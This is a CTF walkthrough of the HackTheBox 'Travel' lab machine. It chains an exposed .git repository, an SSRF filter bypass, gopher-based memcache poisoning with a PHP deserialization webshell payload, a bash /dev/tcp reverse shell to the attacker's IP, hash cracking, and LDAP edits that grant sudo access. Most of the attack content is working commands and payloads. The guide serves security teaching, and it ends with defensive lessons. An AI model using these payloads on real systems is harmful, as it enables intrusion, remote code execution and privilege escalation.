# HackTheBox — Travel: Comprehensive Baby-Steps Walkthrough

**Machine:** Travel  
**OS:** Linux (Ubuntu 20.04)  
**Difficulty:** Hard  
**IP:** `10.129.2.151`  
**Attacker:** `10.10.14.6`  

---

## Introduction: The Big Picture

Before we touch a single command, let's understand what we're looking at. When you approach any machine, your job as a penetration tester is to build a **mental map** of the target. You're asking:

- What services are exposed?
- What does normal traffic look like?
- Where might developers have left behind artifacts?
- What trust relationships exist between components?

Travel is a beautifully constructed machine because it teaches a **chain of vulnerabilities**. No single bug gives you root. Instead, you must connect several weaknesses:

1. **Information Disclosure** → Exposed `.git` directory leaks source code
2. **SSRF (Server-Side Request Forgery)** → The RSS feed fetcher can talk to internal services
3. **Cache Poisoning** → We can write arbitrary data into memcache
4. **PHP Deserialization** → The cache stores serialized PHP objects that execute code when read
5. **Credential Recovery** → A forgotten database backup contains a crackable hash
6. **LDAP Injection/Modification** → SSH is configured to pull users and keys from LDAP, allowing us to manufacture a root path

This walkthrough will explain **every single command**, **every file**, and **every thought process** in extreme detail.

---

## Phase 1: External Reconnaissance — Mapping the Attack Surface

### 1.1 Why Reconnaissance Comes First

You cannot attack what you do not understand. Reconnaissance is about **reducing uncertainty**. We need to know:
- Which ports are open?
- What software versions are running?
- Are there hidden services or virtual hosts?

Hackers don't guess. They enumerate systematically.

### 1.2 Port Scanning with Nmap

```bash
nmap -p- --min-rate 10000 10.129.2.151
```

**What this does:**
- `-p-` scans **all 65,535 TCP ports**. We don't assume only common ports matter. Developers often put services on high ports thinking they're hidden ("security through obscurity").
- `--min-rate 10000` sends packets fast so the scan completes quickly.

**Why this mindset matters:**
Many beginners only scan the top 1000 ports. On a real engagement, that's how you miss management interfaces, backup services, or Docker APIs sitting on port 2375 or 8080.

**Results:**
```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

Only three ports. SSH is rarely the initial entry point on modern boxes (it requires credentials or key-based auth), so we focus on **HTTP and HTTPS**.

### 1.3 Service Version Detection

```bash
nmap -p 22,80,443 -sV -sC 10.129.2.151
```

**What this does:**
- `-sV` probes services to determine version numbers (e.g., nginx 1.17.6, OpenSSH 8.2p1)
- `-sC` runs default NSE (Nmap Scripting Engine) scripts

**The Hacker Mindset:**
Version numbers are gold. If we see nginx 1.17.6, we can search for known CVEs. If we see WordPress 5.4, we can check for plugin vulnerabilities. Even if there's no public exploit, knowing the stack tells us what attack paths are plausible.

**Critical Discovery — SSL Certificate SANs:**
```
ssl-cert: Subject: commonName=www.travel.htb
Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
```

### 1.4 Virtual Hosts: The Hidden Websites

**What is a virtual host?**
Web servers like nginx and Apache can host **multiple websites on the same IP address** by looking at the `Host` header in HTTP requests. The certificate just told us there are **three different websites** on this one IP.

**Why this matters:**
The main site (`www.travel.htb`) might be a polished production site with heavy security. But `blog-dev.travel.htb` sounds like a **development environment** — and dev environments are often less secure, contain debugging features, or leak source code.

**Adding hosts to /etc/hosts:**
```bash
echo "10.129.2.151    travel.htb www.travel.htb blog.travel.htb blog-dev.travel.htb" | sudo tee -a /etc/hosts
```

**Why `/etc/hosts`?**
Your computer needs to resolve hostnames to IPs. Since this is a lab environment without public DNS, we manually map them. Without this, `curl http://blog.travel.htb` wouldn't know where to go.

### 1.5 Enumerating Each Virtual Host

#### www.travel.htb
A static "coming soon" travel site. Non-functional links. We note it but move on.

#### blog.travel.htb
A **WordPress 5.4** blog. WordPress means:
- A database (usually MySQL/MariaDB)
- Themes and plugins (common attack surface)
- User accounts
- An admin panel at `/wp-admin/`

We note the mention of an "Awesome RSS" feature and a TODO comment about copying from `-dev` to `-prod`.

#### blog-dev.travel.htb
**HTTP 403 Forbidden.** 

**The Hacker Mindset:** A 403 is **NOT a dead end**. It means "you can't list the directory," not "there's nothing here." Many attackers give up at 403. The good ones dig deeper.

---

## Phase 2: Finding the Entry Point — The Exposed Git Repository

### 2.1 Why We Directory-Scan

Even if a site returns 403 on the root, there might be **specific files or directories** accessible. Common ones:
- `/.git/` — Git version control metadata
- `/backup/`, `/old/`, `/test/` — Forgotten copies
- `/.env`, `/config.php` — Configuration leaks
- `/robots.txt` — Tells us what the site owner is hiding

### 2.2 Finding .git with Gobuster

```bash
gobuster dir -u http://blog-dev.travel.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

**Discovery:** `/.git/HEAD` returns HTTP 200.

**What is `.git/HEAD`?**
Git stores repository metadata in a `.git` folder. `HEAD` is a small text file that points to the current branch (e.g., `ref: refs/heads/master`). If you can read this file, the **entire `.git` directory might be downloadable**.

**Why developers expose .git:**
They deploy by running `git clone` or copying files but forget to remove `.git`. They might think `.htaccess` protects it, but misconfigurations happen constantly. This is one of the most common and critical vulnerabilities in web applications.

### 2.3 Dumping the Git Repository

We use `git-dumper`, a tool specifically designed to reconstruct a Git repository from an exposed `.git` folder:

```bash
git clone https://github.com/arthaud/git-dumper.git
pip3 install PySocks dulwich
python3 git-dumper/git_dumper.py http://blog-dev.travel.htb/ gitsource
```

**How git-dumper works:**
It walks the Git object database (`.git/objects/`), downloads all commits, trees, and blobs, then reconstructs the file system. Git is a **content-addressable filesystem** — every file version is stored as a hash. If we have all the hashes, we have all the history.

### 2.4 Restoring Deleted Files

```bash
cd gitsource
git checkout -- .
```

**Why this step?**
The repository might have files that were committed but later deleted from the working tree. `git checkout -- .` restores all tracked files to their committed state. This is how we recover source code that isn't currently deployed.

**Files recovered:**
- `README.md`
- `rss_template.php`
- `template.php`

---

## Phase 3: Source Code Analysis — Understanding the Application

### 3.1 README.md — The Developer's Notes

```markdown
# Rss Template Extension
Allows rss-feeds to be shown on a custom wordpress page.

## Setup
* copy rss_template.php & template.php to `wp-content/themes/twentytwenty`
* create logs directory in `wp-content/themes/twentytwenty`

## Changelog
- temporarily disabled cache compression
- added additional security checks
- added caching
- added rss template

## ToDo
- finish logging implementation
```

**Key Intelligence:**
1. These files belong to a WordPress theme (`twentytwenty`)
2. There's a `logs` directory we might be able to write to
3. Caching was added (where? how?)
4. **Logging is unfinished** — this often means half-implemented features with security holes

### 3.2 rss_template.php — The RSS Feed Parser

This file creates the `/awesome-rss/` page on the blog. Let's break it down:

```php
function get_feed($url){
    require_once ABSPATH . '/wp-includes/class-simplepie.php';
    $simplepie = new SimplePie();
    $simplepie->set_cache_location('memcache://127.0.0.1:11211/?timeout=60&prefix=xct_');
    $simplepie->set_feed_url($url);
    $simplepie->init();
    ...
}
```

**What's happening:**
- It uses **SimplePie**, a popular PHP RSS parser
- It caches feed data in **memcache** on `127.0.0.1:11211`
- Cache expires after **60 seconds**
- Cache keys are prefixed with **`xct_`**

**The URL Logic:**
```php
$url = $_SERVER['QUERY_STRING'];
if(strpos($url, "custom_feed_url") !== false){
    $tmp = (explode("=", $url));
    $url = end($tmp);
} else {
    $url = "http://www.travel.htb/newsfeed/customfeed.xml";
}
```

**Why this is dangerous:**
If the query string contains `custom_feed_url`, it splits by `=` and takes the **last part** as the URL. This means:
```
?custom_feed_url&url=http://attacker.com/feed
```
The `$url` becomes `http://attacker.com/feed`.

**The `debug` parameter:**
```php
<!--
DEBUG
<?php
if (isset($_GET['debug'])){
  include('debug.php');
}
?>
-->
```

When `?debug` is passed, it includes `debug.php`, which shows cached memcache data. This is our **reconnaissance tool** for the attack.

### 3.3 template.php — The "Security" Layer

This file has two critical parts:

#### Part A: `safe()` — The Input Filter

```php
function safe($url)
{
    $tmpUrl = urldecode($url);
    if(strpos($tmpUrl, "file://") !== false or strpos($tmpUrl, "@") !== false)
    {       
        die("<h2>Hacking attempt prevented (LFI). Event has been logged.</h2>");
    }
    if(strpos($tmpUrl, "-o") !== false or strpos($tmpUrl, "-F") !== false)
    {       
        die("<h2>Hacking attempt prevented (Command Injection). Event has been logged.</h2>");
    }
    $tmp = parse_url($url, PHP_URL_HOST);
    if($tmp == "localhost" or $tmp == "127.0.0.1")
    {       
        die("<h2>Hacking attempt prevented (Internal SSRF). Event has been logged.</h2>");      
    }
    return $url;
}
```

**What the developer was trying to do:**
- Block `file://` and `@` to prevent Local File Inclusion (LFI)
- Block `-o` and `-F` to prevent curl command injection
- Block `localhost` and `127.0.0.1` to prevent SSRF to internal services

**Why it fails (The Hacker Mindset):**
Input validation is hard. The developer used a **blocklist** ("deny these specific things") instead of an **allowlist** ("only allow these specific things"). Blocklists are inherently incomplete.

**The Bypass:**
`parse_url()` parses the hostname. If we use `2130706433` (the decimal representation of `127.0.0.1`), `parse_url()` returns the string `"2130706433"`, which doesn't equal `"127.0.0.1"` or `"localhost"`. However, when curl resolves it, it converts the decimal IP back to `127.0.0.1`.

Other bypasses that work similarly:
- `0x7f000001` (hexadecimal)
- `0177.0.0.1` (octal)
- `127.1` (short form)

This is a fundamental lesson: **Never trust user input.** And never assume a simple string check is sufficient for security.

#### Part B: `url_get_contents()` — The Command Execution

```php
function url_get_contents ($url) {
    $url = safe($url);
    $url = escapeshellarg($url);
    $pl = "curl ".$url;
    $output = shell_exec($pl);
    return $output;
}
```

**What's happening:**
1. The URL goes through `safe()`
2. `escapeshellarg()` wraps it in single quotes
3. It's passed to `shell_exec()` as part of a curl command

**Why `escapeshellarg` doesn't save us:**
`escapeshellarg` prevents command injection (you can't do `; rm -rf /`), but it **doesn't prevent SSRF**. The URL is still passed to curl, and curl supports many protocols besides HTTP: `ftp://`, `dict://`, `gopher://`, `file://` (if not blocked), etc.

#### Part C: `TemplateHelper` — The Deserialization Gadget

```php
class TemplateHelper
{
    private $file;
    private $data;

    public function __construct(string $file, string $data)
    {
        $this->init($file, $data);
    }

    public function __wakeup()
    {
        $this->init($this->file, $this->data);
    }

    private function init(string $file, string $data)
    {           
        $this->file = $file;
        $this->data = $data;
        file_put_contents(__DIR__.'/logs/'.$this->file, $this->data);
    }
}
```

**What is this class?**
It's an **unfinished logging implementation**. The TODO in README.md said "finish logging implementation via TemplateHelper."

**The critical method: `__wakeup()`**
In PHP, `__wakeup()` is a **magic method** that runs automatically when an object is **deserialized** (converted from a string back to an object). 

**The Attack Idea:**
If we can make the server deserialize a `TemplateHelper` object where:
- `$file` = `shell.php`
- `$data` = `<?php system($_REQUEST['cmd']); ?>`

Then `__wakeup()` will call `init()`, which will write our webshell to:
```
__DIR__.'/logs/'.$this->file
```

Since `template.php` is in `wp-content/themes/twentytwenty/`, the shell goes to:
```
/wp-content/themes/twentytwenty/logs/shell.php
```

---

## Phase 4: Exploiting the Vulnerability Chain

### 4.1 The Attack Chain Overview

Our path to code execution requires connecting multiple dots:

1. **SSRF**: Use `custom_feed_url` to make the server talk to internal memcache
2. **Protocol Smuggling**: Use `gopher://` to send raw memcache commands
3. **Cache Poisoning**: Overwrite a legitimate cache key with our serialized payload
4. **Deserialization Trigger**: Visit the RSS page to read the cache, triggering `__wakeup()`
5. **Webshell**: The deserialized object writes `shell.php`
6. **RCE**: Visit the webshell with commands

### 4.2 Why Gopher and Not HTTP?

If we tried to use `http://127.0.0.1:11211/`, curl would send:
```
GET / HTTP/1.1
Host: 127.0.0.1:11211
User-Agent: curl/7.68.0
Accept: */*
```

Memcache expects **raw text commands**, not HTTP headers. The headers would confuse memcache and break the connection.

**Gopher** is an old protocol that sends **only the payload** after the path, with no headers. Perfect for talking to non-HTTP services.

### 4.3 Understanding Memcache Key Generation

Before we can poison the cache, we need to know **the exact key name**. SimplePie generates it dynamically.

**Step 1: The feed URL is hashed**
```php
$cache_name_function = 'md5';
$filename = md5($url);
```

For the default feed:
```bash
echo -n 'http://www.travel.htb/newsfeed/customfeed.xml' | md5sum
# 3903a76d1e6fef0d76e973a0561cbfc0
```

**Step 2: Append the type**
The cache type for feed data is `spc`:
```bash
echo -n '3903a76d1e6fef0d76e973a0561cbfc0:spc' | md5sum
# 4e5612ba079c530a6b1f148c0b352241
```

**Step 3: Add the prefix**
From `rss_template.php`: `prefix=xct_`

**Final key:** `xct_4e5612ba079c530a6b1f148c0b352241`

**Why we use the default feed key:**
We could host our own feed and calculate a new key, but using the default key is faster. The only risk is that someone else might overwrite it, but on a private instance, that's not an issue.

### 4.4 Crafting the Serialized Payload

We create a local PHP script to generate the exact serialized string:

```php
<?php
class TemplateHelper {
    public $file;
    public $data;
    public function __construct() {
        $this->file = 'shell.php';
        $this->data = '<?php system($_REQUEST["cmd"]); ?>';
    }
}
$obj = new TemplateHelper();
echo serialize($obj);
?>
```

**Why `public` instead of `private`?**
In the original source, `$file` and `$data` are `private`. However, PHP's serialization format for private properties includes null bytes and class names, making manual crafting error-prone. Using `public` in our payload works because PHP's deserialization engine **matches properties by name**, and the `__wakeup()` method reinitializes them through `init()`.

**Output:**
```
O:14:"TemplateHelper":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:34:"<?php system($_REQUEST["cmd"]); ?>";}
```

**Length: 106 bytes.** This is important for the memcache `SET` command.

### 4.5 The Memcache SET Command

Memcache protocol for storing data:
```
set <key> <flags> <exptime> <bytes>\r\n
<value>\r\n
```

For our attack:
```
set xct_4e5612ba079c530a6b1f148c0b352241 4 0 106\r\n
O:14:"TemplateHelper":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:34:"<?php system($_REQUEST["cmd"]); ?>";}\r\n
```

- `4` = flags (arbitrary, mimics what SimplePie uses)
- `0` = expiry (never expire, or 0 = immediate, but memcache still stores it)
- `106` = exact byte length of the payload

### 4.6 The Gopher URL

We URL-encode the memcache command for Gopher:

```
gopher://2130706433:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20106%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:9:%22shell.php%22%3Bs:4:%22data%22%3Bs:34:%22%3C%3Fphp%20system%28%24_REQUEST%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
```

**Breaking it down:**
- `gopher://` = protocol
- `2130706433` = decimal IP for 127.0.0.1 (bypasses safe())
- `:11211` = memcache port
- `/_` = Gopher path separator + payload start
- `%0d%0a` = CRLF (line endings memcache expects)
- `%20` = spaces
- `%22`, `%3B`, `%7B`, `%7D`, `%28`, `%29`, `%5B`, `%5D` = URL-encoded special characters

### 4.7 Executing the Attack

**Step 1: Poison the cache**
```bash
curl -s "http://blog.travel.htb/awesome-rss/?custom_feed_url&url=gopher://2130706433:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20106%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:9:%22shell.php%22%3Bs:4:%22data%22%3Bs:34:%22%3C%3Fphp%20system%28%24_REQUEST%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a"
```

**Step 2: Verify poisoning**
```bash
curl -s "http://blog.travel.htb/awesome-rss/?debug" | grep TemplateHelper
```

If you see the serialized object in the debug output, the cache now contains our payload.

**Step 3: Trigger deserialization**
```bash
curl -s "http://blog.travel.htb/awesome-rss/" > /dev/null
```

When SimplePie initializes, it reads from memcache, calls `unserialize()` on our payload, which triggers `__wakeup()`, which writes `shell.php`.

**Step 4: Confirm RCE**
```bash
curl -s "http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php?cmd=id"
```

**Expected:** `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

### 4.8 Upgrading to a Reverse Shell

A webshell is fine, but an interactive shell is better. We use bash's built-in TCP redirection:

```bash
# On Kali (listener)
nc -lvnp 4444

# Trigger reverse shell via webshell
curl -G "http://blog.travel.htb/wp-content/themes/twentytwenty/logs/shell.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.6/4444 0>&1'"
```

**Why this works:**
Bash can open TCP connections using `/dev/tcp/host/port` pseudo-devices. We redirect stdin (0), stdout (1), and stderr (2) to that TCP socket, giving the attacker a fully interactive shell.

**Stabilizing the shell (optional but recommended):**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z to background
# On Kali:
stty raw -echo; fg
# Press Enter twice
export TERM=xterm
```

---

## Phase 5: Post-Exploitation — Escaping the Container

### 5.1 Discovering We're in a Container

```bash
www-data@blog:/$ ls -la /.dockerenv
-rwxr-xr-x 1 root root 0 Apr 23 18:44 .dockerenv
www-data@blog:/$ hostname
blog
www-data@blog:/$ ip addr
```

**Indicators of a container:**
- `.dockerenv` file exists
- Hostname is `blog` (not `travel`)
- IP is in the Docker range (`172.30.0.10/24`)
- Limited process list

**The Hacker Mindset:**
Containers are sandboxed, but they often share resources with the host. Look for:
- Mounted host directories
- Network access to host services
- Credential files or backups that were copied into the container

### 5.2 Finding the Database Backup

```bash
www-data@blog:/$ ls -la /opt/wordpress/
backup-13-04-2020.sql
```

**Why is this here?**
This is a **snapshot of the database from before deployment**. Developers often create backups during migrations or before updates, then forget to remove them. The file is readable by any user.

```bash
cat /opt/wordpress/backup-13-04-2020.sql | tail -n 20
```

**Discovery:**
```sql
INSERT INTO `wp_users` VALUES 
(1,'admin','$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/','admin','admin@travel.htb',...),
(2,'lynik-admin','$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.','lynik-admin','lynik@travel.htb',...);
```

### 5.3 Understanding the Hash Format

The hash `$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.` is a **WordPress/phppass** hash:
- `$P$` = phpass identifier
- `B/` = iteration count log2 (encoded)
- The rest = salt + hash

**Why crack this?**
`lynik-admin` sounds like a system user, not just a WordPress user. If we can crack this, we might be able to **reuse the password** for SSH.

### 5.4 Cracking the Hash

```bash
# On Kali
echo 'lynik-admin:$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.' > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**How password cracking works:**
John (or Hashcat) takes each password from the wordlist, hashes it with the same algorithm and salt, and compares it to the target hash. `rockyou.txt` contains ~14 million real passwords leaked from the RockYou breach in 2009. It's the most effective wordlist for common passwords.

**Result:** `1stepcloser`

---

## Phase 6: Moving to the Host via SSH

### 6.1 Why SSH?

We could try to escape the container via kernel exploits or mounted volumes, but those are unreliable. **Credential reuse** is much faster. If `lynik-admin` uses the same password for SSH, we can walk right out of the container.

```bash
ssh lynik-admin@10.129.2.151
# password: 1stepcloser
```

**Why it works:**
The SSH server is configured to allow password authentication for `lynik-admin` (and `trvl-admin`), while everyone else must use keys. This is visible in `/etc/ssh/sshd_config`:
```
PasswordAuthentication no
Match User trvl-admin,lynik-admin
    PasswordAuthentication yes
```

### 6.2 Grabbing the User Flag

```bash
lynik-admin@travel:~$ cat user.txt
9aecc[redacted]fdbffb07
```

---

## Phase 7: Privilege Escalation to Root via LDAP

### 7.1 Finding LDAP Credentials

```bash
lynik-admin@travel:~$ cat ~/.ldaprc
HOST ldap.travel.htb
BASE dc=travel,dc=htb
BINDDN cn=lynik-admin,dc=travel,dc=htb
```

This file tells the LDAP client how to connect. But the password is missing.

```bash
lynik-admin@travel:~$ cat ~/.viminfo
```

Inside `.viminfo`, we find:
```
""1	LINE	0
	BINDPW Theroadlesstraveled
```

**What is `.viminfo`?**
Vim stores history, registers, and deleted text in `.viminfo`. The developer edited `.ldaprc`, deleted the `BINDPW` line, saved the file, but **Vim remembered the deletion**. This is a classic OPSEC failure.

### 7.2 LDAP Enumeration

```bash
lynik-admin@travel:~$ ldapsearch -x -w Theroadlesstraveled
```

**What this shows:**
- The domain: `dc=travel,dc=htb`
- Users in `ou=users,ou=linux,ou=servers,dc=travel,dc=htb`
- Groups in `ou=groups,ou=linux,ou=servers,dc=travel,dc=htb`
- `lynik-admin` is an **LDAP administrator**

**Why this matters:**
As an LDAP admin, we have **write access** to user attributes. In environments where SSH authenticates against LDAP, modifying LDAP is equivalent to modifying `/etc/passwd` and `/etc/shadow`.

### 7.3 Understanding the SSH/LDAP Integration

```bash
lynik-admin@travel:~$ cat /etc/ssh/sshd_config | grep -v '^#' | grep .
AuthorizedKeysCommand /usr/bin/sss_ssh_authorizedkeys
AuthorizedKeysCommandUser nobody
PasswordAuthentication no
Match User trvl-admin,lynik-admin
    PasswordAuthentication yes
```

**How this works:**
- `AuthorizedKeysCommand` runs `/usr/bin/sss_ssh_authorizedkeys` when someone tries to SSH with a key
- This program queries **LDAP** for the `sshPublicKey` attribute
- If the key matches, SSH allows login
- `PasswordAuthentication no` means most users **must** use keys

**The implication:**
If we add an `sshPublicKey` attribute to any LDAP user, we can SSH as them. If we also set their `gidNumber` to `27` (the `sudo` group) and give them a password, we can `sudo su -` to root.

### 7.4 Why We Can't Just Modify Root

```bash
cat /etc/sssd/sssd.conf
```

```ini
[nss]
filter_users = root
filter_groups = root
```

SSSD (System Security Services Daemon) explicitly **filters out root** from LDAP lookups. The system is designed to prevent exactly the attack we're attempting on root. So we pick another user.

### 7.5 The Target: Johnny

We pick `johnny` (uid=5004) arbitrarily — any user in the LDAP `users` OU would work. Our goal is three modifications:

1. **Add SSH key** so we can log in
2. **Change `gidNumber` to 27** so he's in the `sudo` group
3. **Set `userPassword`** so we can authenticate with `sudo`

### 7.6 Understanding LDIF (LDAP Data Interchange Format)

An LDIF file describes changes to LDAP entries. The format is strict:

```ldif
dn: <distinguished name>
changeType: modify
<operation>: <attribute>
<attribute>: <value>
-
```

- `dn` = the full path to the object in LDAP
- `changeType: modify` = we're editing, not creating
- `replace:` = overwrite existing value
- `add:` = add new attribute
- `-` = separator between operations

### 7.7 Creating the Payload LDIF

```ldif
dn: uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
changeType: modify
replace: gidNumber
gidNumber: 27
-
replace: userPassword
userPassword: hacked123
-
add: objectClass
objectClass: ldapPublicKey
-
add: sshPublicKey
sshPublicKey: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC4g7oi7o5DjMNJqiszvskd99UqW59ODdCzOjUsOLuma6DjjdyKWnAdqMbKJBspKFPjcXi5NDlP5S3lbdppUPXty9Ya4kE3WbWDw+ZoKfaP3wOQurmxkRqcJ4spP0MT3u5Xum1llfi9Xu5zmNazC1tNiLYHX4LJ9W6iQFIxZxmTVlO6wabDRWzPE75XSDZMPYdt8xTg0Ytul4wnFzJ5ChB3pQ85tnKcDOLEv7kt4jBsSiaAyWr5ZFh3wmy6QAOxYS4wQqDSQedRjQWo65gOdTM0yacGOmAXIrTKONciDyoE7rEV66YhU+mJCCPOubxp5xbx3+BtZP6p0QJooFTpo9909Yyvox404qtMrLFdBbDFTfOq1vhrCZqE58MSlSEhhU9Kao7TdKcNViNdx2qgRQqYkmxQjbPh2Obgr/6S+KIilSGBaBro3aZso0dL6r1GXYKCGTRP+cXpttywem+O9JMuSQXvRmm8pmjZpg5Y6N2QTKGfwulyIeOTv7oZrsWKw76JTBLTjKeCFX56igkC0a5uTOryMPfE8VqMZ8o4bidySJITyXnGmwuPM34Nicv8dQwaRMIM34LWXjeXIb8h/CMvmnp6zogYdZfezVCnjpiKTRjB37/uZ++fM+olQyNeQVVWnKKR+CQFOWcVwM5Ws1gSPnLSthLXB+teHVifP5NKqQ== kali@kali
```

**Why we need `ldapPublicKey`:**
The `sshPublicKey` attribute isn't valid for all object classes. We must first add the `ldapPublicKey` object class to the user's entry, which then allows the `sshPublicKey` attribute.

### 7.8 Applying the LDAP Changes

```bash
ldapadd -D "cn=lynik-admin,dc=travel,dc=htb" -w Theroadlesstraveled -f /dev/shm/johnny.ldif
```

**Output:**
```
modifying entry "uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb"
```

### 7.9 Verifying the Changes

```bash
/usr/bin/sss_ssh_authorizedkeys johnny
```

This should print the SSH public key we just added, confirming SSH will accept it.

### 7.10 SSH as Johnny

```bash
# On Kali
ssh -i /tmp/travel_key johnny@10.129.2.151
```

**What happens:**
- SSH connects to the server
- The server runs `sss_ssh_authorizedkeys johnny`
- This queries LDAP, finds our key
- Authentication succeeds
- We log in as `johnny`

```bash
johnny@travel:~$ id
uid=5004(johnny) gid=27(sudo) groups=27(sudo),5000(domainusers)
```

**The `gid=27(sudo)` is the key.** Johnny is now a member of the sudo group.

### 7.11 Becoming Root

```bash
johnny@travel:~$ sudo su -
[sudo] password for johnny: hacked123
root@travel:~#
```

**Why `sudo su -` works:**
- The `sudo` group is defined in `/etc/sudoers` as having full sudo access
- Johnny's password is `hacked123` (stored in LDAP, synced by SSSD)
- `su -` switches to root and loads root's environment

### 7.12 The Root Flag

```bash
root@travel:~# cat /root/root.txt
4b10d5[redacted]ff045abc5
```

---

## Phase 8: Lessons Learned & Defense

### Key Vulnerabilities Exploited

1. **Exposed `.git` directory** → Always remove `.git` before deployment, or block it in web server config
2. **SSRF via curl** → Never pass user input directly to curl. Use allowlists for URLs
3. **Weak SSRF filter** → Blocklists fail. Use URL parsers and verify against an allowlist of domains
4. **PHP deserialization** → Don't store user-controlled data in caches that get deserialized. Use JSON instead of PHP serialization
5. **Database backups in web root** → Backups should never be in publicly accessible directories
6. **Password reuse** → Never reuse passwords across systems
7. **Viminfo leakage** → Sensitive edits should use `set viminfo=` or editors that don't log history
8. **LDAP without proper access controls** → LDAP admins should be heavily restricted; monitor for unauthorized modifications

### The Hacker Mindset Recap

- **Enumeration is everything.** We found three vhosts, then a `.git` directory, then source code, then a vulnerability chain.
- **Read the source.** The code told us exactly how the cache key was generated and exactly how to bypass the filter.
- **Think in chains.** No single bug gave us root. It took SSRF → cache poisoning → deserialization → credential reuse → LDAP manipulation.
- **Never give up on 403s.** A forbidden directory listing doesn't mean forbidden files.
- **Check everything.** `.viminfo` is often overlooked but contains deleted credentials.

---

## Flags

| Flag | Location | Value |
|------|----------|-------|
| User | `/home/lynik-admin/user.txt` | `9aecceb[redacted]bffb07` |
| Root | `/root/root.txt` | `4b10d5[redacted]f045abc5` |

---

*Happy hacking. Stay curious. Think like a developer, break like an attacker.*
